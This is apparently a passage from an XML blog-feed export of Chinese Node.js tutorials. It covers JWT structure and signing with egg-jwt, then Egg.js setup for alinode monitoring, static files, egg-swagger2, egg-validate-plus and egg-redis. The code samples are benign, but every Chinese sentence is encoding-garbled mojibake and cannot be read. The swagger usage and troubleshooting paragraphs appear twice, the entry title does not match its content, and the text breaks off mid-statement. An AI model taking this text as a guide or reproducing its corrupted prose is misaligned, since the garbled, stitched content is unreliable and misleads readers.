è¯´ç™½äº†å°±æ˜¯æˆ‘ä»¬éœ€è¦åŒ…å«çš„æ•°æ®ï¼Œç±»ä¼¼äºç½‘ç»œè¯·æ±‚çš„è¯·æ±‚ä½“ bodyï¼Œä¾‹å¦‚ï¼š 123456789&#123; &quot;iss&quot;: &quot;zhaomenghaun&quot;, &quot;sub&quot;: &quot;*@agree.com.cn&quot;, &quot;aud&quot;: &quot;www.agree.com.cn&quot;, &quot;exp&quot;: 1526875179, &quot;iat&quot;: 1526871579, &quot;id&quot;: &quot;49a9dd505c9d11e8b5e86b9776bb3c4f&quot;&#125;å¤åˆ¶ä»£ç  è¿™é‡Œé¢çš„å‰äº”ä¸ªå­—æ®µéƒ½æ˜¯ç”± JWT çš„æ ‡å‡†æ‰€å®šä¹‰çš„ã€‚ iss: è¯¥ JWT çš„ç­¾å‘è€… sub: è¯¥ JWT æ‰€é¢å‘çš„ç”¨æˆ· aud: æ¥æ”¶è¯¥ JWT çš„ä¸€æ–¹ exp(expires): ä»€ä¹ˆæ—¶å€™è¿‡æœŸï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ª Unix æ—¶é—´æˆ³ iat(issued at): åœ¨ä»€ä¹ˆæ—¶å€™ç­¾å‘çš„ å°†ä¸‹é¢çš„ JSON å¯¹è±¡è¿›è¡Œbase64 ç¼–ç å¯ä»¥å¾—åˆ°ä¸‹é¢çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æˆ‘ä»¬å°†å®ƒç§°ä½œ JWT çš„ Payloadï¼ˆè½½è·ï¼‰ã€‚ 12345678910const base64url = require(&quot;base64url&quot;);let payload = &#123; id: &quot;49a9dd505c9d11e8b5e86b9776bb3c4f&quot;, iat: 1526871579, exp: 1526875179&#125;;console.log(&quot;payload: &quot; + base64url(JSON.stringify(payload)));// payload: eyJpZCI6IjQ5YTlkZDUwNWM5ZDExZThiNWU4NmI5Nzc2YmIzYzRmIiwiaWF0IjoxNTI2ODcxNTc5LCJleHAiOjE1MjY4NzUxNzl9å¤åˆ¶ä»£ç  ç­¾åï¼ˆSignatureï¼‰ å°†ä¸Šé¢çš„ä¸¤ä¸ªç¼–ç åçš„å­—ç¬¦ä¸²éƒ½ç”¨å¥å·.è¿æ¥åœ¨ä¸€èµ·ï¼ˆå¤´éƒ¨åœ¨å‰ï¼‰ï¼Œå°±å½¢æˆäº†: 12eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjQ5YTlkZDUwNWM5ZDExZThiNWU4NmI5Nzc2YmIzYzRmIiwiaWF0IjoxNTI2ODcxNTc5LCJleHAiOjE1MjY4NzUxNzl9å¤åˆ¶ä»£ç  æœ€åï¼Œæˆ‘ä»¬å°†ä¸Šé¢æ‹¼æ¥å®Œçš„å­—ç¬¦ä¸²ç”¨ HS256 ç®—æ³•è¿›è¡ŒåŠ å¯†ã€‚åœ¨åŠ å¯†çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æä¾›ä¸€ä¸ªå¯†é’¥ï¼ˆsecretï¼‰ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ node-jwa è¿›è¡Œ HS256 ç®—æ³•åŠ å¯†ã€‚å¦‚æœæˆ‘ä»¬ç”¨ 123456 ä½œä¸ºå¯†é’¥çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬åŠ å¯†åçš„å†…å®¹ï¼Œè¿™ä¸€éƒ¨åˆ†åˆå«åšç­¾åã€‚æœ€åä¸€æ­¥ç­¾åçš„è¿‡ç¨‹ï¼Œå®é™…ä¸Šæ˜¯å¯¹å¤´éƒ¨ä»¥åŠè½½è·å†…å®¹è¿›è¡Œç­¾åã€‚ 1234567891011const jwa = require(&quot;jwa&quot;);const hmac = jwa(&quot;HS256&quot;);let secret = &quot;123456&quot;;const signature = hmac.sign( &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjQ5YTlkZDUwNWM5ZDExZThiNWU4NmI5Nzc2YmIzYzRmIiwiaWF0IjoxNTI2ODcxNTc5LCJleHAiOjE1MjY4NzUxNzl9&quot;, secret);console.log(&quot;signature: &quot; + signature);// signature: JtrTx9QaN3BD1QkZhY58MTu6WHn_vQwRBxO9VwJgkhEå¤åˆ¶ä»£ç  æœ€åå°†è¿™ä¸€éƒ¨åˆ†ç­¾åä¹Ÿæ‹¼æ¥åœ¨è¢«ç­¾åçš„å­—ç¬¦ä¸²åé¢ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†å®Œæ•´çš„ JWTï¼Œå¦‚ä¸‹ï¼š 12eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjQ5YTlkZDUwNWM5ZDExZThiNWU4NmI5Nzc2YmIzYzRmIiwiaWF0IjoxNTI2ODcxNTc5LCJleHAiOjE1MjY4NzUxNzl9.JtrTx9QaN3BD1QkZhY58MTu6WHn_vQwRBxO9VwJgkhEå¤åˆ¶ä»£ç  æ•´ä¸ªå®Œæ•´è¿‡ç¨‹èµ°ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ€è€ƒä¸€ä¸‹é—®é¢˜ï¼ŒToken æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦å¯ä»¥ä¼ è¾“æ•æ„Ÿä¿¡æ¯ï¼Ÿ æˆ‘ä»¬ç°åœ¨æ˜ç™½äº†ä¸€ä¸ª token æ˜¯ç”± Header çš„ Base64 ç¼–ç  + Payload çš„ Base64 ç¼–ç  + Signature ä¸‰æ®µç»„æˆï¼Œå½“å…¶ä»–äººæ‹¿åˆ°æˆ‘ä»¬çš„ Tokenï¼Œå¯ä»¥é€šè¿‡ Token å‰ä¸¤æ®µ Base64 è§£ç å¾—åˆ° Header å’Œ Payload å¯¹è±¡ï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡ node-jsonwebtoken æ¨¡å— decode æ–¹æ³•ç›´æ¥ â€œç ´è§£â€ æˆ‘ä»¬çš„ Tokenã€‚ 123456789const jwt = require(&quot;jsonwebtoken&quot;);let decoded = jwt.decode( &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjQ5YTlkZDUwNWM5ZDExZThiNWU4NmI5Nzc2YmIzYzRmIiwiaWF0IjoxNTI2ODcxNTc5LCJleHAiOjE1MjY4NzUxNzl9.JtrTx9QaN3BD1QkZhY58MTu6WHn_vQwRBxO9VwJgkhE&quot;, &#123; complete: true &#125;);console.log(&quot;jsonwebtoken: &quot; + JSON.stringify(decoded));// jsonwebtoken: &#123;&quot;header&quot;:&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;,&quot;payload&quot;:&#123;&quot;id&quot;:&quot;49a9dd505c9d11e8b5e86b9776bb3c4f&quot;,&quot;iat&quot;:1526871579,&quot;exp&quot;:1526875179&#125;,&quot;signature&quot;:&quot;JtrTx9QaN3BD1QkZhY58MTu6WHn_vQwRBxO9VwJgkhE&quot;&#125;å¤åˆ¶ä»£ç  æ‰€ä»¥æˆ‘ä»¬çš„ payload ä¸èƒ½é‡Œé¢ä¸èƒ½åŒ…å«è¯¸å¦‚å¯†ç è¿™ç§æ•æ„Ÿä¿¡æ¯ï¼Œå¯¹äºæˆ‘ä»¬è¿™é‡Œçš„ id æ˜¯ä¸€ä¸² uuidï¼Œå³ä½¿æ‹¿åˆ°ä¹Ÿæ— æ³•ç›´æ¥åˆ¤å®šç›¸å…³å†…å®¹ï¼Œä»è€Œä¸ä¼šç›´æ¥æ³„éœ²æˆ‘ä»¬çš„å†…å®¹ã€‚ ä¸€èˆ¬è€Œè¨€ï¼ŒåŠ å¯†ç®—æ³•å¯¹äºä¸åŒçš„è¾“å…¥äº§ç”Ÿçš„è¾“å‡ºæ€»æ˜¯ä¸ä¸€æ ·çš„ã€‚å¯¹äºä¸¤ä¸ªä¸åŒçš„è¾“å…¥ï¼Œäº§ç”ŸåŒæ ·çš„è¾“å‡ºçš„æ¦‚ç‡æå…¶åœ°å°ã€‚å¦‚æœæœ‰äººå¯¹å¤´éƒ¨ä»¥åŠè½½è·çš„å†…å®¹è§£ç ä¹‹åè¿›è¡Œä¿®æ”¹ï¼Œå†è¿›è¡Œç¼–ç çš„è¯ï¼Œé‚£ä¹ˆæ–°çš„å¤´éƒ¨å’Œè½½è·çš„ç­¾åå’Œä¹‹å‰çš„ç­¾åå°±å°†æ˜¯ä¸ä¸€æ ·çš„ï¼Œè€Œä¸”å¦‚æœä¸çŸ¥é“æœåŠ¡å™¨åŠ å¯†çš„æ—¶å€™ç”¨çš„å¯†é’¥çš„è¯ï¼Œå¾—å‡ºæ¥çš„ç­¾åä¹Ÿä¸€å®šä¼šæ˜¯ä¸ä¸€æ ·çš„ã€‚ æ‰€ä»¥æœåŠ¡ç«¯æ‹¿åˆ° JWT åï¼Œé¦–å…ˆä¼šæ ¡éªŒç­¾åæ˜¯å¦è¿‡æœŸï¼Œä»¥åŠå¯¹å¤´éƒ¨å’Œè½½è·çš„å†…å®¹ç”¨åŒä¸€ç®—æ³•ï¼ˆé€šè¿‡ JWT çš„å¤´éƒ¨ alg å­—æ®µæŒ‡å®šï¼‰å†æ¬¡ç­¾åå¾—åˆ°çš„ JWT å’Œç”¨æˆ·ä¼ é€’çš„ JWT æ˜¯å¦ä¸€è‡´ã€‚å¦‚æœæœåŠ¡å™¨åº”ç”¨å¯¹å¤´éƒ¨å’Œè½½è·å†æ¬¡ä»¥åŒæ ·æ–¹æ³•ç­¾åä¹‹åå‘ç°ï¼Œè‡ªå·±è®¡ç®—å‡ºæ¥çš„ç­¾åå’Œæ¥å—åˆ°çš„ç­¾åä¸ä¸€æ ·ï¼Œé‚£ä¹ˆå°±è¯´æ˜è¿™ä¸ª Token çš„å†…å®¹è¢«åˆ«äººåŠ¨è¿‡çš„ï¼Œæˆ‘ä»¬åº”è¯¥æ‹’ç»è¿™ä¸ª Tokenï¼Œè¿”å›ä¸€ä¸ª HTTP 401 Unauthorized å“åº”ã€‚ egg-jwt æ’ä»¶æ–‡æ¡£ï¼šgithub.com/okoala/egg-â€¦ egg-jwt åŸºäº node-jsonwebtoken å®ç°ï¼Œå®Œæ•´æ–‡æ¡£å¯ä»¥å‚è€ƒ github.com/auth0/node-â€¦ã€‚jwt å¯¹è±¡æŒ‚è½½åœ¨ app å¯¹è±¡ä¸‹ï¼Œå¯ä»¥é€šè¿‡ app.jwt è®¿é—® jwt çš„ä¸‰ä¸ªæ–¹æ³•ï¼š jwt.sign(payload, secretOrPrivateKey, [options, callback])â€”â€”â€”â€”ç”Ÿæˆ token å­—ç¬¦ä¸² jwt.verify(token, secretOrPublicKey, [options, callback])â€”â€”â€”â€”æ ¡éªŒ token åˆæ³•æ€§ jwt.decode(token [, options])â€”â€”â€”â€”token è¯‘ç  å®‰è£…ï¼š 12$ npm i egg-jwt --saveå¤åˆ¶ä»£ç  é…ç½®ï¼š app/config/plugin.js é…ç½®ï¼š 12345exports.jwt = &#123; enable: true, package: &quot;egg-jwt&quot;&#125;;å¤åˆ¶ä»£ç  app/config/config.default.js é…ç½®ï¼š 12345exports.jwt = &#123; enable: false, secret: &quot;xxxxxxxxxxxxx&quot;&#125;;å¤åˆ¶ä»£ç  è°ƒç”¨ï¼š è¯·æ±‚å¤´ï¼š 12Authorization: Bearer &#123;access_token&#125;å¤åˆ¶ä»£ç  æ³¨ï¼šaccess_token ä¸ºç™»å½•åè¿”å›çš„ token å€¼ã€‚ app/service/user.jsï¼š 12345678910111213141516171819202122232425262728293031323334353637/** * ç”Ÿæˆ Token * @param &#123;Object&#125; data */createToken(data) &#123; return app.jwt.sign(data, app.config.jwt.secret, &#123; expiresIn: &quot;12h&quot; &#125;);&#125;/** * éªŒè¯tokençš„åˆæ³•æ€§ * @param &#123;String&#125; token */verifyToken(token) &#123; return new Promise((resolve, reject) =&gt; &#123; app.jwt.verify(token, app.config.jwt.secret, function(err, decoded) &#123; let result = &#123;&#125;; if (err) &#123; /* err = &#123; name: &apos;TokenExpiredError&apos;, message: &apos;jwt expired&apos;, expiredAt: 1408621000 &#125; */ result.verify = false; result.message = err.message; &#125; else &#123; result.verify = true; result.message = decoded; &#125; resolve(result); &#125;); &#125;);&#125;å¤åˆ¶ä»£ç  extend/helper.jsï¼š 12345678910111213141516171819202122232425262728293031323334353637383940// è·å– Tokenexports.getAccessToken = ctx =&gt; &#123; let bearerToken = ctx.request.header.authorization; return bearerToken &amp;&amp; bearerToken.replace(&quot;Bearer &quot;, &quot;&quot;);&#125;;// æ ¡éªŒ Tokenexports.verifyToken = async (ctx, userId) =&gt; &#123; let token = this.getAccessToken(ctx); let verifyResult = await ctx.service.user.verifyToken(token); if (!verifyResult.verify) &#123; ctx.helper.error(ctx, 401, verifyResult.message); return false; &#125; if (userId != verifyResult.message.id) &#123; ctx.helper.error(ctx, 401, &quot;ç”¨æˆ· ID ä¸ Token ä¸ä¸€è‡´&quot;); return false; &#125; return true;&#125;;// å¤„ç†æˆåŠŸå“åº”exports.success = (ctx, result = null, message = &quot;è¯·æ±‚æˆåŠŸ&quot;, status = 200) =&gt; &#123; ctx.body = &#123; code: 0, message: message, data: result &#125;; ctx.status = status;&#125;;// å¤„ç†å¤±è´¥å“åº”exports.error = (ctx, code, message) =&gt; &#123; ctx.body = &#123; code: code, message: message &#125;; ctx.status = code;&#125;;å¤åˆ¶ä»£ç  controller ä¸­è°ƒç”¨ï¼š 12345678910// ç”ŸæˆTokenlet token = ctx.service.user.createToken(&#123; id: user.id &#125;);// æ ¡éªŒTokenåˆæ³•æ€§let isVerify = await ctx.helper.verifyToken(ctx, id);if (isVerify) &#123; // åˆæ³•é€»è¾‘ // ...&#125;å¤åˆ¶ä»£ç  è¿™æ ·å¯¹äºéœ€è¦è¿›è¡Œèº«ä»½è®¤è¯çš„ restful APIï¼Œå°±å¯ä»¥é€šè¿‡ token è¿›è¡Œè®¤è¯ï¼Œä»è€Œå®ç°ç”¨æˆ·è®¤è¯å’Œæˆæƒã€‚]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Egg æºç åˆ†æä¹‹ egg-coreï¼ˆä¸€ï¼‰]]></title>
    <url>%2F2020%2F03%2F18%2FNode.js%2Fegg-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E4%B8%8A%E7%BA%BF%20(%E4%B8%8B)%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5cf47b3df265da1bac40007e 10 é˜¿é‡Œç›‘æ§ Node.js æ€§èƒ½å¹³å°ï¼ˆalinodeï¼‰ æ˜¯é¢å‘æ‰€æœ‰ Node.js åº”ç”¨æä¾› æ€§èƒ½ç›‘æ§ã€å®‰å…¨æé†’ã€æ•…éšœæ’æŸ¥ã€æ€§èƒ½ä¼˜åŒ– ç­‰æœåŠ¡çš„æ•´ä½“æ€§è§£å†³æ–¹æ¡ˆï¼Œæä¾›å®Œå–„çš„å·¥å…·é“¾å’ŒæœåŠ¡ï¼ŒååŠ©å¼€å‘è€…å¿«é€Ÿå‘ç°å’Œå®šä½çº¿ä¸Šé—®é¢˜ã€‚ 1npm i nodeinstall -g æä¾›äº†egg-alinode æ¥å¿«é€Ÿæ¥å…¥ï¼Œæ— éœ€å®‰è£… agenthub ç­‰é¢å¤–çš„å¸¸é©»æœåŠ¡ã€‚ 12345678npm i egg-alinode --saveå¤åˆ¶ä»£ç // /config/plugin.jsexports.alinode = &#123; enable:true, package:&apos;egg-alinode&apos;,&#125; ç”³è¯·ä¸€ä¸‹æœåŠ¡ è®¿é—®æ§åˆ¶å° æ§åˆ¶å°åœ°å€ï¼šnode.console.aliyun.com 12345678910111213// config/config.default.jsexports.alinode = &#123; enable: true, appid: &apos;***&apos;, // Node.js æ€§èƒ½å¹³å°ç»™æ‚¨çš„é¡¹ç›®ç”Ÿæˆçš„ appid secret: &apos;***&apos;, // Node.js æ€§èƒ½å¹³å°ç»™æ‚¨çš„é¡¹ç›®ç”Ÿæˆçš„ secret logdir: &apos;***&apos;, //å¯é€‰ï¼ŒNode.js æ€§èƒ½å¹³å°æ—¥å¿—è¾“å‡ºåœ°å€ç»å¯¹è·¯å¾„ï¼Œä¸ NODE_LOG_DIR ä¿æŒä¸€è‡´ã€‚å¦‚ï¼š/tmp/ï¼Œä¹Ÿå¯ä»¥ä¸å†™ error_log: [ // &apos;æ‚¨çš„åº”ç”¨åœ¨ä¸šåŠ¡å±‚é¢äº§ç”Ÿçš„å¼‚å¸¸æ—¥å¿—çš„è·¯å¾„ï¼Œæ•°ç»„ï¼Œå¯é€‰ï¼Œå¯é…ç½®å¤šä¸ª&apos;, // &apos;ä¾‹å¦‚ï¼š/root/.logs/error.#YYYY#-#MM#-#DD#.log&apos;, // &apos;ä¸æ›´æ”¹ Egg é»˜è®¤æ—¥å¿—è¾“å‡ºè·¯å¾„å¯ä¸é…ç½®æœ¬é¡¹ç›®&apos;, ],// å¯é€‰ agentidMode:&apos;IP&apos;, // å¯é€‰ï¼Œå¦‚æœè®¾ç½®ï¼Œåˆ™åœ¨å®ä¾‹IDä¸­æ·»åŠ éƒ¨åˆ†IPä¿¡æ¯ï¼Œç”¨äºå¤šä¸ªå®ä¾‹ hostname ç›¸åŒçš„åœºæ™¯ï¼ˆä»¥å®¹å™¨ä¸ºä¸»ï¼‰&#125;; ç„¶åä½ å°±èƒ½æ„‰å¿«é’ˆå¯¹ä½ çš„eggï¼Œè¿›è¡Œç›‘æ§äº† è·å–swggeråœ°å€ è¾“å…¥æµè§ˆå™¨ ä½ çœ‹åˆ°å°±æ˜¯æ–‡æ¡£äº† ç‚¹å‡»try it out è¾“å…¥ä½ ä¼ çš„å€¼,ç„¶åç‚¹å‡»Execute ç»“æœ ä½ å°±å¯ä»¥è·å–åˆ°æ¥å£ä¼ é€’è¿‡æ¥çš„å€¼,æ•ˆæœç±»ä¼¼postman,ä½†æ˜¯æ¸…æ™°ç¨‹åº¦æ¯”postmanå¥½ 12.5 å¸¸è§é—®é¢˜ä¸€èˆ¬æƒ…å†µä¸‹éƒ½ä¸ä¼šæœ‰é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœä½ è¿™æ—¶å€™å·§å¦™çš„ç”¨äº†egg-static,é‚£ä¹ˆä½ å°±ä¼šæŠ¥é”™äº†ç»è¿‡æ’æŸ¥ï¼Œä½ å°±ä¼šå‘ç° /node_modules/egg-swagger2/app.js å®ƒä¼šæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæŠ¥é”™å¿…é¡»æ˜¯ä¸ªå­—ç¬¦ä¸²,ç„¶åä½ æ‡‚å¾—..ä½ ç»™ä»–åšæˆä¸€ä¸ªå­—ç¬¦ä¸²å³å¯ 11 å¼•å…¥é™æ€æ–‡ä»¶11.1 ç»è¿‡æµ‹è¯•æ’ä»¶è®¾ç½®1234exports.ejs = &#123; enable: true, package: &apos;egg-view-ejs&apos;,&#125;; 11.2 é…ç½®è®¾ç½® aï¼šé™æ€æ–‡ä»¶ 1234567config.static = &#123; prefix: &apos;/&apos;, dir: path.join(appInfo.baseDir, &apos;app/public/&apos;) &#125; å½“ç„¶æ­¤æ—¶ä½ ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œä½ æƒ³è¦å¤šä¸ªæ–‡ä»¶è¯¥å¦‚ä½•äº‹å¥½ 123456config.static = &#123; prefix: &apos;/&apos;, dir: [ path.join(appInfo.baseDir, &apos;app/view/&apos;), path.join(appInfo.baseDir, &apos;app/public/uploads/&apos;), path.join(appInfo.baseDir, &apos;app/public/swagger/&apos;) ], &#125;; bï¼šæ¨¡æ¿è®¾ç½® 1234567config.view = &#123; defaultExt: &apos;.html&apos;, mapping: &#123; &apos;.ejs&apos;: &apos;ejs&apos;, &apos;.html&apos;: &apos;ejs&apos;, &#125;&#125; 11.3 è·¯ç”±æ§åˆ¶å™¨è®¾ç½®//å°† index.html æ”¾åœ¨app/viewé‡Œï¼Œé™æ€æ–‡ä»¶æ”¾åœ¨publicé‡Œ 12345const &#123; ctx &#125; = this;// render user.htmlyield ctx.render(&apos;index&apos;); 12 egg-swagger212.1 è¿è¥åœºæ™¯ä½œä¸ºåå°,ä¾‹å¦‚æœ‰äººéœ€è¦åå°æä¾›æ–‡æ¡£â€¦.äººå®¶javaéƒ½æœ‰swagger,eggåœ¨ egg-swagger2 æ”¯æŒä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚ 12.2 å®‰è£… npm i egg-swagger2 -S 12.3 å¼€å¯æ’ä»¶12345// config/plugin.jsexports.swagger2 = &#123; enable: true, package: &apos;egg-swagger2&apos;,&#125;; 12.4 æ’ä»¶é…ç½®config.default.js ä¸­é…ç½® 123456789101112131415161718192021222324252627282930313233343536373839404142434445config.swagger2 = &#123; enable: true, // ç¦ç”¨swagger , é»˜è®¤ä¸ºtrue base: &#123; /* default config,support cover schemes: [ &apos;http&apos;, ], host: &apos;127.0.0.1:7001&apos;, basePath: &apos;/&apos;, consumes: [ &apos;application/json&apos;, ], produces: [ &apos;application/json&apos;, ], */ info: &#123; description: &apos;æ–‡æ¡£ä»‹ç», version: &apos;1.0.0&apos;, title: &apos;æ–‡æ¡£åç§°&apos;, contact: &#123; email: &apos;caandoll@aliyun.com&apos;, &#125;, license: &#123; name: &apos;Apache 2.0&apos;, url: &apos;http://www.apache.org/licenses/LICENSE-2.0.html&apos;, &#125;, &#125;, tags: [&#123; name: &apos;admin&apos;, description: &apos;Admin desc&apos;, &#125;, &#123; name: &apos;role&apos;, description: &apos;Role desc&apos;, &#125;, ], definitions: &#123; // model definitions &#125;, securityDefinitions: &#123; // security definitions &#125; &#125;, &#125;; 12.4 ä¾‹å­åœ¨ /app/router.jsæ–‡ä»¶ä¸­ 12.4.1 postè¯·æ±‚123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657module.exports = app =&gt; &#123; const &#123; router, controller, swagger &#125; = app; router.post(&apos;/login&apos;, controller.test.postLogin); swagger.post(&apos;/login&apos;, &#123; tags: [ &apos;admin&apos;, ], summary: &apos;Login a admin&apos;, description: &apos;&apos;, parameters: [ &#123; in: &apos;body&apos;, name: &apos;body&apos;, description: &apos;admin\&apos;s username &amp; password&apos;, required: true, schema: &#123; type: &apos;object&apos;, required: [ &apos;username&apos;, &apos;password&apos; ], properties: &#123; username: &#123; type: &apos;string&apos;, description: &apos;admin\&apos;s username&apos;, &#125;, password: &#123; type: &apos;string&apos;, description: &apos;admin\&apos;s password&apos;, &#125;, &#125;, &#125;, &#125;, ], responses: &#123; 200: &#123; description: &apos;SUCCEED&apos;, schema: &#123; type: &apos;object&apos;, properties: &#123; status: &#123; type: &apos;string&apos;, description: &apos;status&apos;, &#125;, data: &#123; type: &apos;object&apos;, description: &apos;data&apos;, properties: &#123; token: &#123; type: &apos;string&apos;, description: &apos;token&apos;, &#125;, &#125;, &#125;, &#125;, &#125;, &#125;, &#125;, &#125;);&#125; 12.4.2 getè¯·æ±‚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061module.exports = app =&gt; &#123; const &#123; router, controller, swagger &#125; = app; router.get(&apos;/roles&apos;, controller.test.getRoles); swagger.get(&apos;/roles&apos;, &#123; tags: [&apos;role&apos;,], summary: &apos;search role by page&apos;, description: &apos;&apos;, parameters: [&#123; in: &apos;query&apos;, name: &apos;name&apos;, description: &apos;role\&apos;s name&apos;, &#125;, &#123; in: &apos;query&apos;, name: &apos;pageIndex&apos;, description: &apos;pageIndex&apos;, &#125;, &#123; in: &apos;query&apos;, name: &apos;pageSize&apos;, description: &apos;pageSize&apos;, &#125;, ], responses: &#123; 200: &#123; description: &apos;SUCCEED&apos;, schema: &#123; type: &apos;object&apos;, properties: &#123; status: &#123; type: &apos;string&apos;, description: &apos;status&apos;, &#125;, datas: &#123; type: &apos;array&apos;, description: &apos;result datas&apos;, properties: &#123; token: &#123; type: &apos;string&apos;, description: &apos;token&apos;, &#125;, &#125;, &#125;, pageIndex: &#123; type: &apos;number&apos;, description: &apos;pageIndex&apos;, &#125;, pageSize: &#123; type: &apos;number&apos;, description: &apos;pageSize&apos;, &#125;, totalCount: &#123; type: &apos;number&apos;, description: &apos;totalCount&apos;, &#125;, &#125;, &#125;, &#125;, &#125;, &#125;);&#125; 12.4.3 swaggerçš„ä½¿ç”¨ npm run dev è·‘èµ·æ¥ ![image.png](data:image/svg+xml;utf8,) è·å–swggeråœ°å€ è¾“å…¥æµè§ˆå™¨ ä½ çœ‹åˆ°å°±æ˜¯æ–‡æ¡£äº† ç‚¹å‡»try it out è¾“å…¥ä½ ä¼ çš„å€¼,ç„¶åç‚¹å‡»Execute ç»“æœ ä½ å°±å¯ä»¥è·å–åˆ°æ¥å£ä¼ é€’è¿‡æ¥çš„å€¼,æ•ˆæœç±»ä¼¼postman,ä½†æ˜¯æ¸…æ™°ç¨‹åº¦æ¯”postmanå¥½ 12.5 å¸¸è§é—®é¢˜ä¸€èˆ¬æƒ…å†µä¸‹éƒ½ä¸ä¼šæœ‰é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœä½ è¿™æ—¶å€™å·§å¦™çš„ç”¨äº†egg-static,é‚£ä¹ˆä½ å°±ä¼šæŠ¥é”™äº†ç»è¿‡æ’æŸ¥ï¼Œä½ å°±ä¼šå‘ç° /node_modules/egg-swagger2/app.js å®ƒä¼šæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæŠ¥é”™å¿…é¡»æ˜¯ä¸ªå­—ç¬¦ä¸²,ç„¶åä½ æ‡‚å¾—..ä½ ç»™ä»–åšæˆä¸€ä¸ªå­—ç¬¦ä¸²å³å¯ 13 è¡¨å•æ ¡éªŒæœºåˆ¶ npm egg-validate-plus â€“save 13.1 å¼€å¯æ’ä»¶123456// config/plugin.&#123;env&#125;.jsexports.validatePlus = &#123; enable: true, package: &apos;egg-validate-plus&apos;,&#125;; 13.2 é…ç½®æ’ä»¶1234567891011121314151617181920// config/config.&#123;env&#125;.jsconfig.validatePlus = &#123; resolveError(ctx, errors) &#123; if (errors.length) &#123; ctx.type = &apos;json&apos;; ctx.status = 400; ctx.body = &#123; code: 400, error: errors, message: &apos;å‚æ•°é”™è¯¯&apos;, &#125;; &#125; &#125;&#125;; 13.3 ä½¿ç”¨æ’ä»¶13.3.1 ä¼ å…¥å­—ç¬¦ä¸²12// app/controller/xx.jsconst &#123; query &#125; = this.ctx.request; æ‹¿åˆ°éªŒè¯ç»“æœ 1const validateResult = await this.ctx.validate(&apos;user.login&apos;, query) éªŒè¯ä¸é€šè¿‡æ—¶ï¼Œé˜»æ­¢åé¢çš„ä»£ç æ‰§è¡Œ 1if (!validateResult) return &gt; æ³¨æ„ï¼šä¸è¦å¸¦ä¸Š rules 13.3.2 ç›´æ¥ä¼ å…¥éªŒè¯è§„åˆ™å¯¹è±¡1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// app/controller/xx.js// ç›´æ¥å¼•å…¥ rules æ–‡ä»¶ä¸‹çš„éªŒè¯è§„åˆ™ï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå·±å†™çš„éªŒè¯è§„åˆ™å¯¹è±¡const rule = this.app.rules.user.login// æ•°æ®æ ¼å¼// const rule = &#123;// id: [// &#123; required: true &#125;,// &#123; type: &apos;number&apos;, message: &apos;id å¿…é¡»ä¸ºæ•°å­— &#125;// ],// password: [// &#123; required: true &#125;,// &#123; type: &apos;string&apos;, message: &apos;password å¿…é¡»ä¸ºå­—ç¬¦ä¸² &#125;// ]// &#125;// ä»å®¢æˆ·ç«¯ä¼ å…¥çš„å‚æ•°const &#123; query &#125; = this.ctx.request;// æ•°æ®æ ¼å¼ï¼š// query = &#123;// username: 123456,// password: &apos;abcdefg&apos;// &#125;// æ‹¿åˆ°éªŒè¯ç»“æœconst validateResult = await this.ctx.validate(rule, query)// éªŒè¯ä¸é€šè¿‡æ—¶ï¼Œé˜»æ­¢åé¢çš„ä»£ç æ‰§è¡Œif (!validateResult) return 14 è¿æ¥redis Redis client(support redis portocal) based on ioredis for egg framework 14.1 å®‰è£…1npm i egg-redis --save 14.2 é…ç½®Change ${app_root}/config/plugin.js to enable redis plugin: 1234567exports.redis = &#123; enable: true, package: &apos;egg-redis&apos;,&#125;; Configure redis information in ${app_root}/config/config.default.js:Single Client 12345678config.redis = &#123; client: &#123; port: 6379, // Redis port host: &apos;127.0.0.1&apos;, // Redis host password: &apos;auth&apos;, db: 0, &#125;&#125; 14.3 ä½¿ç”¨æ–¹æ³•14.3.1 serviceapp/service/redis.js if(this.app.redis)åˆ¤æ–­æ˜¯å¦æœ‰å¯ç”¨redis 1234567891011121314151617181920212223242526&apos;use strict&apos;;const Service = require(&apos;egg&apos;).Service;class RedisService extends Service &#123; async set(key, value, seconds) &#123; value = JSON.stringify(value); if (this.app.redis) &#123; if (!seconds) &#123; await this.app.redis.set(key, value); &#125; else &#123; await this.app.redis.set(key, value, &apos;EX&apos;, seconds); &#125; &#125; &#125; async get(key) &#123; if (this.app.redis) &#123; const data = await this.app.redis.get(key); if (!data) return; return JSON.parse(data); &#125; &#125;&#125;module.exports = RedisService; 14.3.2 controllerapp/controller/default/index.jså¦‚æœæ²¡æœ‰è®¾ç½®redisç¼“å­˜ï¼Œå°±å»è¯·æ±‚æ•°æ®,å†è®¾ç½®ç¼“å­˜ 1234567var topNav = await 